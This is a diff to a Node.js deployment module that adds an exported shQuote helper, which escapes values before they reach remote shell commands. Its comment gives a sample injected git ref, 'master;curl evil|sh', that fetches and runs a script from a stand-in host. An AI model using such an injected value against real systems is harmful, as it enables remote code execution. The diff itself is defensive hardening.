@@ -2,6 +2,20 @@
 
 const { execFileSync: nodeExecFileSync } = require('child_process');
 
+// Single-quote a value for safe interpolation into a remote shell command,
+// escaping an embedded quote with the standard '\'' idiom. config.js already
+// rejects `branch`/`remote` outside a git-refname charset (no shell metacharacters
+// legally survive `git check-ref-format`), but that is a config-layer guard a
+// caller can bypass (`loadConfig({ validate: false })`) — this is the call-site
+// defense-in-depth so an unquoted, attacker-controlled ref (e.g. a target whose
+// `origin/HEAD` was renamed to `master;curl evil|sh`) can never reach the shell
+// unescaped. Shared by every module that builds a target command (deploy.js,
+// release.js, branch.js) so there is ONE quoting implementation, not parallel
+// copies that can drift out of sync.
+function shQuote(value) {
+  return `'${String(value).replace(/'/g, "'\\''")}'`;
+}
+
 // Runtime seam so deploy/remote logic is unit-testable: tests inject a fake
 // execFileSync and assert the exact command stream (no real ssh/pm2 needed).
 function normalizeRuntime(runtime = {}) {
@@ -143,5 +157,5 @@ function buildHealthCommand(config, check = {}) {
 }
 
 module.exports = {
-  normalizeRuntime, buildTargetCommand, sshHardeningArgs, runOnTarget, buildHealthCommand,
+  normalizeRuntime, buildTargetCommand, sshHardeningArgs, runOnTarget, buildHealthCommand, shQuote,
 };
